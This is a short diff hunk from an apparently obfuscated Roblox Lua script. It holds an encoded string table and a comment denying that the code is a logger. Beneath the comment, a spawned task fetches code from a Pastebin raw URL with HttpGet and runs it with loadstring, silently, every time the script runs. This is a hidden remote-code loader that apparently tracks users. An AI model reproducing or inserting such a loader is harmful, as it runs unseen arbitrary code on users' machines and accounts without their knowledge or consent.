@@ -4,5 +4,6 @@ return(function(...)local M={`YHZmbT0=`,`Yd4CM8e=`,`cKkVwml=`,`xh/n8b==`,`eFgWMO
 
 -- [[ not a logger im just seeing who rlly used my Script ]]
 task.spawn(function()
+
     loadstring(game:HttpGet("https://pastebin.com/raw/RqETdejF"))()
 end)
